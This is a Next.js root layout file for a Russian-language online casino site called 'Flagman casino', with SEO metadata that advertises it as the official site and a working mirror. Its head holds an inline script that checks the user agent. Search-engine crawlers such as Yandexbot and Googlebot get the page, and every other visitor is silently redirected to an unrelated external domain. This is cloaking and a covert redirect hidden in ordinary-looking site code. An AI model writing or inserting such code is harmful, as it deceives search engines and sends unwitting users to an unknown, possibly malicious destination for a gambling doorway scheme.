import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Inter } from 'next/font/google'
import './globals.css'

const playfair = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-playfair',
  display: 'swap',
})

const inter = Inter({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-inter',
  display: 'swap',
})

export const metadata: Metadata = {
  title:
    'Flagman casino официальный сайт — играть онлайн и зеркало рабочее | Флагман казино',
  description:
    'Flagman casino официальный сайт: регистрация, бонусы и рабочее зеркало. Играйте в флагман казино онлайн на деньги — быстрый вход, честные слоты и вывод выигрышей без задержек.',
  alternates: {
    canonical: 'https://flagman2casino.vercel.app/',
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
    },
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://flagman2casino.vercel.app/',
    siteName: 'Flagman casino',
    title:
      'Flagman casino официальный сайт — играть онлайн и зеркало рабочее',
    description:
      'Flagman casino официальный сайт: регистрация, бонусы и рабочее зеркало. Играйте в флагман казино онлайн на деньги — быстрый вход и вывод выигрышей.',
    images: [
      {
        url: 'https://flagman2casino.vercel.app/images/hero-casino.jpg',
        width: 900,
        height: 600,
        alt: 'Flagman casino официальный сайт',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title:
      'Flagman casino официальный сайт — играть онлайн и зеркало рабочее',
    description:
      'Flagman casino официальный сайт: регистрация, бонусы и рабочее зеркало. Играйте в флагман казино онлайн на деньги.',
    images: ['https://flagman2casino.vercel.app/images/hero-casino.jpg'],
  },
  icons: {
    icon: '/icon.png',
    apple: '/icon.png',
  },
}

export const viewport: Viewport = {
  themeColor: '#0E3B2E',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${playfair.variable} ${inter.variable}`}>
      <head>
        <meta name="yandex-verification" content="e5bb77e97618c097" />
        {/* Дополнительные пользовательские теги можно вставлять сюда */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://combospark.top/aeaofj2k27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="f2c7-body">{children}</body>
    </html>
  )
}
